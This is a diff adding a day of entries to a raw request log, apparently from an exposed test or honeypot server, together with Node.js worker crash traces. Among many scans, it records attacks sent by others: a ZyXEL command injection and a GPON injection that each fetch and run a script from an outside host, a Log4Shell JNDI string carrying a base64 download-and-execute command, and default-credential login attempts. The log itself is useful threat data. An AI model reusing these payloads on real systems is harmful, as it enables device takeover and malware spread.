@@ -30393,3 +30393,167 @@ Mon Feb 07 2022 20:01:00 GMT+0800 (HKT) HTTP ::ffff:192.241.207.136:54054 GET / 
 
 Mon Feb 07 2022 22:58:13 GMT+0800 (HKT) HTTP ::ffff:78.108.177.50:35970 GET / ["User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)","Accept","*/*"]
 
+Tue Feb 08 2022 00:08:21 GMT+0800 (HKT) HTTP ::ffff:185.180.143.72:56746 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 00:08:22 GMT+0800 (HKT) HTTP ::ffff:185.180.143.72:57684 GET /backend ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 01:23:14 GMT+0800 (HKT) HTTP undefined:undefined POST /GponForm/diag_Form?images/ ["Host","127.0.0.1:8080","Connection","keep-alive","Accept-Encoding","gzip, deflate","Accept","*/*","User-Agent","Hello, World","Content-Length","118"]
+58576562506167654e616d653d6469616726646961675f616374696f6e3d70696e672677616e5f636f6e6c6973743d3026646573745f686f73743d60603b776765742b687474703a2f2f3131372e3231332e34302e35373a34393037372f4d6f7a692e6d2b2d4f2b2d3e2f746d702f67706f6e383038
+Tue Feb 08 2022 02:36:05 GMT+0800 (HKT) HTTP ::ffff:79.54.109.121:54972 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 02:57:03 GMT+0800 (HKT) HTTP ::ffff:141.101.196.233:6106 GET http://fingerprints.bablosoft.com/ip?Z75946152982Q1 ["Host","fingerprints.bablosoft.com","Cookie","Z75946152982Q1","User-Agent","Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0","Referer","https://google.com/","Content-Type","application/x-www-form-urlencoded","Content-Length","9","Connection","close"]
+706f73743d74727565
+Tue Feb 08 2022 03:40:29 GMT+0800 (HKT) HTTP ::ffff:136.144.41.27:34484 GET / ["Host","172.104.76.143:8080"]
+
+Tue Feb 08 2022 03:40:29 GMT+0800 (HKT) HTTP ::ffff:136.144.41.27:35208 GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd%20/tmp;wget%20http://136.144.41.151/multi/wget.sh%20-O-%20>s;chmod%20777%20s;sh%20s%20Exploit.ZyxeNas;+%23&password=asdf ["Host","172.104.76.143:8080","Content-Type","application/x-www-form-urlencoded","Connection","close","Accept-Encoding","gzip, deflate","User-Agent","Mozila/5.0"]
+
+Tue Feb 08 2022 03:41:39 GMT+0800 (HKT) HTTP ::ffff:216.131.111.131:61002 GET http://dyn.epicgifs.net/test6956.php ["User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36","Host","dyn.epicgifs.net","Accept","*/*"]
+
+Tue Feb 08 2022 03:50:09 GMT+0800 (HKT) HTTP ::ffff:2.248.77.65:51193 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7","Content-Length","0"]
+
+Tue Feb 08 2022 04:44:47 GMT+0800 (HKT) HTTP ::ffff:128.14.209.170:38054 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 04:45:22 GMT+0800 (HKT) HTTP ::ffff:144.126.220.31:35644 POST /cgi-bin/webctrl.cgi ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language","en-GB,en;q=0.5","Accept-Encoding","gzip, deflate","Content-Type","application/x-www-form-urlencoded","Content-Length","115","Connection","keep-alive","Referer","http://125.62.218.180:8080/cgi-bin/webctrl.cgi?action=sysinfo_page","Cookie","sesskey=","Upgrade-Insecure-Requests","1"]
+616374696f6e3d6c6f67696e5f61757468656e7469636174696f6e2672656469726563745f616374696f6e3d737973696e666f5f70616765266c6f67696e5f757365726e616d653d626c7565616e67656c266c6f67696e5f70617373776f72643d626c7565616e67656c2642313d4c6f67696e
+Tue Feb 08 2022 04:57:17 GMT+0800 (HKT) HTTP ::ffff:167.94.138.61:48428 GET / ["Host","172.104.76.143:8080"]
+
+Tue Feb 08 2022 04:57:17 GMT+0800 (HKT) HTTP ::ffff:167.94.138.61:58362 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 04:58:19 GMT+0800 (HKT) HTTP ::ffff:176.226.179.223:40605 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 05:52:51 GMT+0800 (HKT) HTTP ::ffff:62.221.125.248:32622 GET http://webcam1.strangled.net/hellob?rnd=78cc1bfeaa8ce99ef02e412acc9769ee&rn=934129938 ["Host","webcam1.strangled.net","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Accept","*/*","Accept-Encoding","gzip","Proxy-Connection","Keep-Alive"]
+
+Tue Feb 08 2022 06:02:51 GMT+0800 (HKT) HTTP ::ffff:205.185.114.157:41462 GET / ["Content-Type","application/x-www-form-urlencoded","X-Api-Version","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//209.141.57.192:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}')","User-Agent","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//209.141.57.192:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}')","Referer","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//209.141.57.192:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}')","Cookie","t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//209.141.57.192:2420/TomcatBypass/Command/Base64/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}')","host","172.104.76.143:8080","Connection","close"]
+
+Tue Feb 08 2022 06:03:55 GMT+0800 (HKT) TCP new client ::ffff:162.142.125.10:46108
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 14983 died
+Worker 18220 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Tue Feb 08 2022 06:03:56 GMT+0800 (HKT) TCP new client ::ffff:162.142.125.10:57646
+Tue Feb 08 2022 06:03:57 GMT+0800 (HKT) TCP ::ffff:162.142.125.10:57646 client data str GET / HTTP/1.1
+Host: 172.104.76.143:8124
+
+
+Tue Feb 08 2022 06:03:57 GMT+0800 (HKT) TCP ::ffff:162.142.125.10:57646 client data buf 474554202f20485454502f312e310d0a486f73743a203137322e3130342e37362e3134333a383132340d0a0d0a
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 18220 died
+Worker 18226 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Tue Feb 08 2022 06:14:19 GMT+0800 (HKT) HTTP ::ffff:71.6.232.4:40820 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 07:34:48 GMT+0800 (HKT) HTTP ::ffff:154.89.5.77:53794 GET / ["Host","172.104.76.143:8080","Accept","*/*"]
+
+Tue Feb 08 2022 07:37:34 GMT+0800 (HKT) HTTP ::ffff:77.253.224.87:41589 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7","Content-Length","0"]
+
+Tue Feb 08 2022 08:45:26 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:43154 GET / []
+
+Tue Feb 08 2022 08:45:26 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:47704 OPTIONS / []
+
+Tue Feb 08 2022 08:45:26 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:47728 GET /nice%20ports%2C/Tri%6Eity.txt%2ebak []
+
+Tue Feb 08 2022 08:48:29 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:35926 POST /sdk ["Content-Length","441","User-Agent","Mozilla/5.0 (compatible;)","Host","172.104.76.143:8080","Connection","close"]
+3c736f61703a456e76656c6f706520786d6c6e733a7873643d22687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612220786d6c6e733a7873693d22687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e63652220786d6c6e733a736f61703d22687474703a2f2f736368656d61732e786d6c736f61702e6f72672f736f61702f656e76656c6f70652f223e3c736f61703a4865616465723e3c6f7065726174696f6e49443e30303030303030312d30303030303030313c2f6f7065726174696f6e49443e3c2f736f61703a4865616465723e3c736f61703a426f64793e3c526574726965766553657276696365436f6e74656e7420786d6c6e733d2275726e3a696e7465726e616c76696d3235223e3c5f74686973207873693a747970653d224d616e616765644f626a6563745265666572656e63652220747970653d2253657276696365496e7374616e6365223e53657276696365496e7374616e63653c2f5f746869733e3c2f526574726965766553657276696365436f6e74656e743e3c2f736f61703a426f64793e3c2f736f61703a456e76656c6f70653e
+Tue Feb 08 2022 08:48:30 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:37560 GET /HNAP1 ["User-Agent","Mozilla/5.0 (compatible;)","Host","172.104.76.143:8080","Connection","close"]
+
+Tue Feb 08 2022 08:48:30 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:37694 GET /evox/about ["User-Agent","Mozilla/5.0 (compatible;)","Host","172.104.76.143:8080","Connection","close"]
+
+Tue Feb 08 2022 08:48:49 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:34570 GET / ["Host","172.104.76.143"]
+
+Tue Feb 08 2022 09:37:43 GMT+0800 (HKT) HTTP ::ffff:176.120.196.25:33742 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 10:13:16 GMT+0800 (HKT) HTTP ::ffff:103.230.15.57:44524 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 10:48:22 GMT+0800 (HKT) HTTP ::ffff:184.105.139.68:33442 GET / ["Host","172.104.76.143"]
+
+Tue Feb 08 2022 11:30:56 GMT+0800 (HKT) HTTP ::ffff:46.174.191.28:38364 GET / ["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30","Accept","*/*"]
+
+Tue Feb 08 2022 13:42:42 GMT+0800 (HKT) HTTP ::ffff:43.130.11.228:44286 GET / ["Host","172.104.76.143:8080","User-Agent","curl/7.64.1","Accept","*/*"]
+
+Tue Feb 08 2022 13:55:30 GMT+0800 (HKT) HTTP ::ffff:136.144.41.27:38748 GET / ["Host","172.104.76.143:8080"]
+
+Tue Feb 08 2022 13:55:31 GMT+0800 (HKT) HTTP ::ffff:136.144.41.27:40120 GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd%20/tmp;wget%20http://136.144.41.151/multi/wget.sh%20-O-%20>s;chmod%20777%20s;sh%20s%20Exploit.ZyxeNas;+%23&password=asdf ["Host","172.104.76.143:8080","Content-Type","application/x-www-form-urlencoded","Connection","close","Accept-Encoding","gzip, deflate","User-Agent","Mozila/5.0"]
+
+Tue Feb 08 2022 14:02:09 GMT+0800 (HKT) HTTP ::ffff:78.186.186.50:43281 GET / ["Host","172.104.76.143","Accept","text/plain,text/html"]
+
+Tue Feb 08 2022 14:08:19 GMT+0800 (HKT) HTTP ::ffff:45.146.165.37:36598 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36","Accept-Encoding","gzip","Connection","close"]
+
+Tue Feb 08 2022 14:20:35 GMT+0800 (HKT) HTTP ::ffff:78.246.4.25:51623 GET / ["Host","172.104.76.143","Accept","text/plain,text/html"]
+
+Tue Feb 08 2022 14:39:10 GMT+0800 (HKT) HTTP ::ffff:103.114.158.1:44960 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Language","en;q=0.9","Cache-Control","max-age=0","Connection","keep-alive","Dnt","1","Sec-Gpc","1","Upgrade-Insecure-Requests","1","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 14:39:10 GMT+0800 (HKT) HTTP ::ffff:103.114.158.1:44960 GET /favicon.ico ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Language","en;q=0.9","Cache-Control","max-age=0","Connection","keep-alive","Dnt","1","Sec-Gpc","1","Upgrade-Insecure-Requests","1","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 15:12:22 GMT+0800 (HKT) HTTP ::ffff:78.108.177.52:35970 GET / ["User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)","Accept","*/*"]
+
+Tue Feb 08 2022 15:27:11 GMT+0800 (HKT) HTTP ::ffff:125.46.243.169:43762 GET /boaform/admin/formLogin?username=admin&psd=admin []
+
+Tue Feb 08 2022 15:29:52 GMT+0800 (HKT) HTTP ::ffff:46.174.191.28:38364 GET / ["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30","Accept","*/*"]
+
+Tue Feb 08 2022 15:31:18 GMT+0800 (HKT) HTTP ::ffff:104.140.188.58:41535 GET / ["Host","172.104.76.143:8080","User-Agent","https://gdnplus.com:Gather Analyze Provide."]
+
+Tue Feb 08 2022 15:32:01 GMT+0800 (HKT) HTTP ::ffff:219.156.67.131:58065 GET /boaform/admin/formLogin?username=user&psd=user []
+
+Tue Feb 08 2022 16:19:20 GMT+0800 (HKT) HTTP ::ffff:62.221.125.248:64486 GET http://www.freeproxies.ml/helloa?rnd=9dbbfa2595b7cae4e43ea6c09147a2b3&rn=748803852 ["Host","www.freeproxies.ml","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15","Accept","*/*","Accept-Encoding","gzip","Proxy-Connection","Keep-Alive"]
+
+Tue Feb 08 2022 18:57:07 GMT+0800 (HKT) HTTP ::ffff:103.62.233.206:57980 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 19:14:35 GMT+0800 (HKT) HTTP ::ffff:76.10.176.104:35363 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 19:20:25 GMT+0800 (HKT) HTTP ::ffff:63.250.114.235:44258 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 19:24:49 GMT+0800 (HKT) HTTP ::ffff:2.56.59.134:47158 GET /config/getuser?index=0 ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0","Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language","en-GB,en;q=0.5","Accept-Encoding","gzip, deflate","Connection","close","Upgrade-Insecure-Requests","1"]
+
+Tue Feb 08 2022 20:35:05 GMT+0800 (HKT) HTTP ::ffff:178.212.49.134:37949 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36","Content-Length","0"]
+
+Tue Feb 08 2022 20:41:48 GMT+0800 (HKT) HTTP ::ffff:192.241.214.42:54740 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Tue Feb 08 2022 22:10:56 GMT+0800 (HKT) HTTP ::ffff:141.101.196.233:60970 GET http://api.ipify.org/?Z75946152982Q1 ["Host","api.ipify.org","Cookie","Z75946152982Q1","User-Agent","Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0","Referer","https://google.com/","Content-Type","application/x-www-form-urlencoded","Content-Length","9","Connection","close"]
+706f73743d74727565
+Tue Feb 08 2022 22:25:40 GMT+0800 (HKT) TCP new client ::ffff:167.94.138.118:42308
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 18226 died
+Worker 31934 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Tue Feb 08 2022 22:25:42 GMT+0800 (HKT) TCP new client ::ffff:167.94.138.118:57190
+Tue Feb 08 2022 22:25:43 GMT+0800 (HKT) TCP ::ffff:167.94.138.118:57190 client data str GET / HTTP/1.1
+Host: 172.104.76.143:8124
+
+
+Tue Feb 08 2022 22:25:43 GMT+0800 (HKT) TCP ::ffff:167.94.138.118:57190 client data buf 474554202f20485454502f312e310d0a486f73743a203137322e3130342e37362e3134333a383132340d0a0d0a
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 31934 died
+Worker 31942 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
